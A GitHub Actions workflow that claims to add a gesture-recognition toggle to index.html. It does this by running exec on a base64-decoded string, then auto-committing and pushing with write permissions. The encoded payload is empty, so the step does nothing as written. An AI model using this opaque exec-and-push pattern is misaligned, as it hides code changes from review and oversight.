name: Gesture recognition toggle

on:
  push:
    paths:
      - '.github/workflows/gesture-recognition-toggle.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Add recognition toggle
        shell: bash
        run: python -c "import base64; exec(base64.b64decode(''))"
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git commit -m "Add gesture recognition on off toggle"
          git push
